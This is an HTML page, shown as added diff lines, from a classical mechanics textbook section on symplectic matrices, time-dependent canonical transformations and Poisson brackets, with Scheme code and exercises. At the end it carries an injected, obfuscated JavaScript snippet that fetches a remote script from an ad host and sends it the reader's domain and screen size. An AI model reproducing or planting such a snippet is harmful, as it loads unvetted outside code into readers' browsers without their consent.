+<div align=left><img src="chap5-Z-G-49.gif" border="0"></div>
+<p>
+<a name="%_idx_2556"></a><a name="%_idx_2558"></a>is called a <em>symplectic matrix</em>.</p>
+<p>
+
+Here is an alternate test for whether a transformation is symplectic:
+</p>
+<p><tt><a name="%_idx_2560"></a>(define&nbsp;((symplectic-transform?&nbsp;C)&nbsp;s)<br>
+&nbsp;&nbsp;(symplectic-matrix?<br>
+&nbsp;&nbsp;&nbsp;(qp-submatrix<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(s-&gt;m&nbsp;(compatible-shape&nbsp;s)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;((D&nbsp;C)&nbsp;s)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s))))<br>
+</p>
+</tt>
+<p></p>
+<p><tt><a name="%_idx_2562"></a>(define&nbsp;(symplectic-matrix?&nbsp;M)<br>
+&nbsp;&nbsp;(let&nbsp;((2n&nbsp;(m:dimension&nbsp;M)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((J&nbsp;(symplectic-unit&nbsp;(quotient&nbsp;2n&nbsp;2))))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(-&nbsp;J&nbsp;(*&nbsp;M&nbsp;J&nbsp;(m:transpose&nbsp;M))))))<br>
+</p>
+</tt>
+<p>The procedure
+<tt>symplectic-transform?</tt>
+returns a zero matrix
+if and only if the transformation being tested passes the symplectic
+matrix test.  An appropriate
+symplectic unit matrix of a given size is produced by the procedure 
+<a name="%_idx_2564"></a><tt>symplectic-unit</tt>.</p>
+<p>
+The point transformations are symplectic.  For example,
+</p>
+<p><tt>(print-expression<br>
+&nbsp;((symplectic-transform?&nbsp;(F-&gt;CT&nbsp;p-&gt;r))<br>
+&nbsp;&nbsp;(up&nbsp;'t<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'r&nbsp;'theta)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'p_r&nbsp;'p_theta))))<br>
+<i>(matrix-by-rows&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0))</i><br>
+</p>
+</tt>
+<p>
+</p>
+<p><a name="%_thm_5.6"></a>
+<b>Exercise 5.6.</b>&nbsp;&nbsp;<strong>Symplectic matrices</strong><br>
+<a name="%_idx_2566"></a><a name="%_idx_2568"></a>
+Let <strong><em>A</em></strong> be a symplectic matrix: <strong><em>J</em></strong><sub><em>n</em></sub>  =  <strong><em>A</em></strong> <strong><em>J</em></strong><sub><em>n</em></sub>
+<strong><em>A</em></strong><sup><tt><em>T</em></tt></sup> .  Show that <strong><em>A</em></strong><sup><tt><em>T</em></tt></sup> and <strong><em>A</em></strong><sup><tt>-</tt>1</sup> are
+symplectic.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_5.7"></a>
+<b>Exercise 5.7.</b>&nbsp;&nbsp;<strong>Whittaker transform</strong><br>
+<a name="%_idx_2570"></a>
+Shew that the transformation 
+ <em>q</em>  =  log ( (1/<em>q</em>') sin <em>p</em>' )  with
+ <em>p</em>  =  <em>q</em>' cot <em>p</em>' is symplectic.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_5.2.3"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_5.2.3">5.2.3&nbsp;&nbsp;Time-Dependent Transformations</a></h3>
+<p>
+<a name="%_idx_2572"></a><a name="%_idx_2574"></a>
+We have found that a time-independent transformation (involving the
+coordinates and conjugate momenta, but not the time) is canonical if
+the derivative of the transformation is symplectic.  Let's
+return to the calculation of the symplectic condition, but now allow
+explicit time dependence in the transformation equations.  </p>
+<p>
+If the transformation is time dependent, then it turns out that <em>H</em>
+<small>o</small> <em>C</em> does not make a suitable <em>H</em>'.
+Instead, we assume
+<a name="EQUATION_5.50"></a></p>
+<div align=left><img src="chap5-Z-G-50.gif" border="0"></div>
+<p>
+and look for conditions on <em>K</em> and <em>C</em> that guarantee the
+transformation is canonical.  Equation (<a href="#EQUATION_5.24">5.25</a>),
+the condition that a transformation is canonical, becomes
+<a name="EQUATION_5.51"></a></p>
+<div align=left><img src="chap5-Z-G-51.gif" border="0"></div>
+<p>
+This condition is satisfied if the following two conditions are
+satisfied:
+<a name="EQUATION_5.52"></a></p>
+<div align=left><img src="chap5-Z-G-52.gif" border="0"></div>
+<p>
+and
+<a name="EQUATION_5.53"></a></p>
+<div align=left><img src="chap5-Z-G-53.gif" border="0"></div>
+<p>
+Condition&nbsp;(<a href="#EQUATION_5.52">5.52</a>) is the condition that <em>C</em> is a
+symplectic transformation.  Condition&nbsp;(<a href="#EQUATION_5.53">5.53</a>) is an
+auxiliary condition on <em>K</em>.  This condition does not actually depend
+on the Hamiltonian <em>H</em> because the constant value of <img src="chap1-Z-G-D-35.gif" border="0">
+does not depend on the argument.  The time component is always
+satisfied; only the coordinate and momentum components of this
+condition constrain <em>K</em>.  Evaluated at a particular state <em>s</em> (with
+compatible shape <em>s</em><sup>*</sup>), the condition on <em>K</em> is
+<a name="EQUATION_5.54"></a></p>
+<div align=left><img src="chap5-Z-G-54.gif" border="0"></div>
+<p>
+explicitly showing that the Hamiltonian <em>H</em> does not enter.</p>
+<p>
+Thus we can conclude that a time-dependent transformation is canonical
+if its position-momentum part is symplectic and if we form the new
+Hamiltonian by adding an appropriate piece.  Note that we have not
+proven that the position-momentum part must be symplectic.  Rather, we
+have shown that if this part is symplectic then the Hamiltonian must
+be modified in an appropriate way.</p>
+<p>
+As a program, the test for <em>K</em> is
+</p>
+<p><tt>(define&nbsp;((canonical-K?&nbsp;C&nbsp;K)&nbsp;s)<br>
+&nbsp;&nbsp;(let&nbsp;((s*&nbsp;(compatible-shape&nbsp;s)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(-&nbsp;(T-func&nbsp;s*)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(+&nbsp;(*&nbsp;((D&nbsp;C)&nbsp;s)&nbsp;(J-func&nbsp;((D&nbsp;K)&nbsp;s)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(((partial&nbsp;0)&nbsp;C)&nbsp;s)))))<br>
+</p>
+</tt>
+<p>
+</p>
+<a name="%_sec_Temp_347"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_347">Rotating coordinates</a></h4>
+<p><a name="%_idx_2576"></a><a name="%_idx_2578"></a><a name="%_idx_2580"></a>
+Consider a time-dependent transformation to uniformly rotating
+coordinates:
+<a name="EQUATION_5.55"></a></p>
+<div align=left><img src="chap5-Z-G-55.gif" border="0"></div>
+<p>
+with components
+<a name="EQUATION_5.56"></a></p>
+<div align=left><img src="chap5-Z-G-56.gif" border="0"></div>
+<p>
+As a program this is
+</p>
+<p><tt>(define&nbsp;((rotating&nbsp;n)&nbsp;state)<br>
+&nbsp;&nbsp;(let&nbsp;((t&nbsp;(time&nbsp;state))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(q&nbsp;(coordinate&nbsp;state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((x&nbsp;(ref&nbsp;q&nbsp;0))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(y&nbsp;(ref&nbsp;q&nbsp;1))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(z&nbsp;(ref&nbsp;q&nbsp;2)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;(+&nbsp;(*&nbsp;(cos&nbsp;(*&nbsp;n&nbsp;t))&nbsp;x)&nbsp;(*&nbsp;(sin&nbsp;(*&nbsp;n&nbsp;t))&nbsp;y))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(-&nbsp;(*&nbsp;(cos&nbsp;(*&nbsp;n&nbsp;t))&nbsp;y)&nbsp;(*&nbsp;(sin&nbsp;(*&nbsp;n&nbsp;t))&nbsp;x))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;z))))<br>
+</p>
+</tt>
+<p>The extension of this transformation to a phase-space transformation
+is
+</p>
+<p><tt>(define&nbsp;(C-rotating&nbsp;Omega)&nbsp;(F-&gt;CT&nbsp;(rotating&nbsp;Omega)))<br>
+</p>
+</tt>
+<p>We first verify that the position-momentum part of this time-dependent
+transformation is symplectic:
+</p>
+<p><tt>(print-expression<br>
+&nbsp;((symplectic-transform?&nbsp;(C-rotating&nbsp;'Omega))<br>
+&nbsp;&nbsp;(up&nbsp;'t&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'x&nbsp;'y&nbsp;'z)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'px&nbsp;'py&nbsp;'pz))))<br>
+<i>(matrix-by-rows&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0))</i><br>
+</p>
+</tt>
+<p>For this transformation the appropriate correction to the Hamiltonian
+is
+<a name="EQUATION_5.57"></a></p>
+<div align=left><img src="chap5-Z-G-57.gif" border="0"></div>
+<p>
+which is the rate of rotation of the coordinate system multiplied by
+the angular momentum.  The justification for this will be given in
+section&nbsp;<a href="book-Z-H-63.html#%_sec_5.6">5.6</a>.  The implementation is
+</p>
+<p><tt>(define&nbsp;((K&nbsp;Omega)&nbsp;s)<br>
+&nbsp;&nbsp;(let&nbsp;((q&nbsp;(coordinate&nbsp;s))&nbsp;(p&nbsp;(momentum&nbsp;s)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((x&nbsp;(ref&nbsp;q&nbsp;0))&nbsp;(y&nbsp;(ref&nbsp;q&nbsp;1))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(px&nbsp;(ref&nbsp;p&nbsp;0))&nbsp;(py&nbsp;(ref&nbsp;p&nbsp;1)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;-1&nbsp;Omega&nbsp;(-&nbsp;(*&nbsp;x&nbsp;py)&nbsp;(*&nbsp;y&nbsp;px))))))<br>
+</p>
+</tt>
+<p>Applying the test, we find:
+</p>
+<p><tt>(print-expression<br>
+&nbsp;&nbsp;((canonical-K?&nbsp;(C-rotating&nbsp;'Omega)&nbsp;(K&nbsp;'Omega))<br>
+&nbsp;&nbsp;&nbsp;(up&nbsp;'t&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'x&nbsp;'y&nbsp;'z)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'p_x&nbsp;'p_y&nbsp;'p_z))))<br>
+<i>(up&nbsp;0&nbsp;(up&nbsp;0&nbsp;0&nbsp;0)&nbsp;(down&nbsp;0&nbsp;0&nbsp;0))</i><br>
+</p>
+</tt>
+<p>The residuals are zero so this <em>K</em> completes the canonical transformation.</p>
+<p>
+</p>
+<a name="%_sec_5.2.4"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_5.2.4">5.2.4&nbsp;&nbsp;The Symplectic Condition</a></h3>
+<p>
+<a name="%_idx_2582"></a><a name="%_idx_2584"></a>
+A transformation is symplectic if the <em>q</em><em>p</em> part of the transformation
+has a symplectic derivative.  
+This condition can be written simply in terms of
+Poisson brackets.</p>
+<p>
+<a name="%_idx_2586"></a>The Poisson bracket can be written in terms of <img src="chap5-Z-G-D-1.gif" border="0">:
+<a name="EQUATION_5.58"></a></p>
+<div align=left><img src="chap5-Z-G-58.gif" border="0"></div>
+<p>
+as can be seen by writing out the components.</p>
+<p>
+We break the transformation <em>C</em> into position and momentum parts:
+<a name="EQUATION_5.59"></a></p>
+<div align=left><img src="chap5-Z-G-59.gif" border="0"></div>
+<p>
+In terms of the individual component functions, the symplectic
+condition&nbsp;(<a href="#EQUATION_5.46">5.46</a>) is
+<a name="EQUATION_5.61"></a></p>
+<div align=left><img src="chap5-Z-G-60.gif" border="0"></div>
+<p>
+where <img src="chap1-Z-G-D-17.gif" border="0"><sup><em>i</em></sup><sub><em>j</em></sub> is one if <em>i</em> = <em>j</em> and zero otherwise.
+These are called the <a name="%_idx_2588"></a><a name="%_idx_2590"></a><em>fundamental Poisson brackets</em>.  If 
+a transformation satisfies these
+Poisson bracket relations then it is symplectic.</p>
+<p>
+We have found that a time-dependent transformation is
+canonical if its position-momentum part is symplectic and we modify
+the Hamiltonian by the addition of a suitable <em>K</em>.  We can rewrite
+these conditions in terms of Poisson brackets.  If the Hamiltonian&nbsp;is
+<a name="EQUATION_5.62"></a></p>
+<div align=left><img src="chap5-Z-G-61.gif" border="0"></div>
+<p>
+the transformation will be canonical if
+the coordinate-momentum transformation satisfies the fundamental
+Poisson brackets, and
+<em>K</em> satisfies:
+<a name="EQUATION_5.63"></a></p>
+<div align=left><img src="chap5-Z-G-62.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_5.8"></a>
+<b>Exercise 5.8.</b>&nbsp;&nbsp;<strong></strong><br></p>
+<p>
+Fill in the details to show that the symplectic
+condition&nbsp;(<a href="#EQUATION_5.31">5.31</a>) is equivalent to
+the fundamental Poisson brackets&nbsp;(<a href="#EQUATION_5.61">5.61</a>)
+and that the condition on <em>K</em>&nbsp;(<a href="#EQUATION_5.53">5.53</a>) is equivalent
+to the Poisson bracket condition on
+<em>K</em>&nbsp;(<a href="#EQUATION_5.63">5.63</a>).</p>
+<p>
+</p>
+
+<p></p>
+<p>
+
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_334" href="#call_footnote_Temp_334"><sup><small>4</small></sup></a> It is in principle impossible to determine in general if two
+functions are the same, but in this case, since <img src="chap5-Z-G-D-2.gif" border="0">(<em>D</em><em>C</em>(<em>s</em>)) is
+linear, this test is valid.</p>
+
+<p><a name="footnote_Temp_335" href="#call_footnote_Temp_335"><sup><small>5</small></sup></a> The shape of <em>D</em><em>H</em>(<em>s</em>) is a <em>compatible shape</em> to the
+<a name="%_idx_2510"></a><a name="%_idx_2512"></a>  shape of <em>s</em>: if they are multiplied the result is a real number.  The
+procedure <tt>compatible-shape</tt> takes any structure and produces
+another structure that is guaranteed to multiply with the given
+structure to produce a real number.  The structure produced is filled
+with unique real literals, so if the residual is zero then the
+functions are the same.</p>
+
+<p><a name="footnote_Temp_336" href="#call_footnote_Temp_336"><sup><small>6</small></sup></a> Actually, for <em>I</em> = 0 the transform is not well defined and so it is not
+compositional canonical for that value.  This transformation is ``locally
+compositional canonical'' in that it is compositional canonical for
+nonzero values of <em>I</em>.  We will ignore this essentially topological problem.</p>
+
+<p><a name="footnote_Temp_337" href="#call_footnote_Temp_337"><sup><small>7</small></sup></a> The mysterious symbols such as <tt>x8102</tt> are unique
+real literals introduced to test functional equalities.  That they
+appear in a residual demonstrates that the equality is invalid.</p>
+
+<p><a name="footnote_Temp_342" href="#call_footnote_Temp_342"><sup><small>8</small></sup></a> The derivative of a linear transformation is a constant
+function, independent of the argument.</p>
+
+<p><a name="footnote_Temp_343" href="#call_footnote_Temp_343"><sup><small>9</small></sup></a> The procedure <tt>s-&gt;m</tt> takes three arguments: 
+<tt>(s-&gt;m <em>s*</em> <em>A</em> <em>s</em>)</tt>.  The <tt><em>s*</em></tt> and <tt><em>s</em></tt> specify the shapes of objects that multiply <tt><em>A</em></tt> on the
+left and right to give a numerical value; these specify the basis. </p>
+
+<p><a name="footnote_Temp_344" href="#call_footnote_Temp_344"><sup><small>10</small></sup></a> The <em>q</em><em>p</em> submatrix of a 2<em>n</em> + 1-dimensional square matrix is
+the 2<em>n</em>-dimensional matrix obtained by deleting the first row and the
+first column of the given matrix.
+This can be computed by:
+</p>
+<p><tt>(define&nbsp;(qp-submatrix&nbsp;m)<br>
+&nbsp;&nbsp;(m:submatrix&nbsp;m&nbsp;1&nbsp;(m:num-rows&nbsp;m)&nbsp;1&nbsp;(m:num-cols&nbsp;m)))<br>
+</p>
+</tt>
+<p></p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-58.html">previous</a></span><span>, <a href="book-Z-H-60.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2U%2fBU0sV5d8FEfxiLTlG87YyfajYWRdTk5YIFjBEoKiH8lhKFpPPIR1HFmHJsE50%2fvrupaz%2bLMAMUwQA1eA05AfSkpUTQcPhHPrhdpWZq23uB%2fH5wRrpfOIFkaDzGLZgwiAYf6jocLK0hjiv946kHANTxqqEXbr%2fzR3%2f76%2fAL9icsHVBrzfWNatV1%2fXvHPGXsq0XWOJLMdaOuzEnwl3JhM9vTG6pRpyW0hyvE7A5Ii26GNBTyXM0toocRzc0PRhL8XPvjvmvz6LoJelvzorq05Y9CVl4nEdq29%2fntrx8%2fhUuiTSicY1H5mmosS0EYpfyuQ%2brvhXWDp%2frE3T3oPWrZpbCgFRO7hjOL48A8ISTdqziW%2fmbtqiI3%2bffwWvbONy4LElsFJkZNJddYWRXA84Ad1EwsDNB%2bvlSDZk%2ba3H7AFWHPiTq5IVM8v90l7YBzWl3D%2bdtAEavs8QUojg4eqcXz5");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
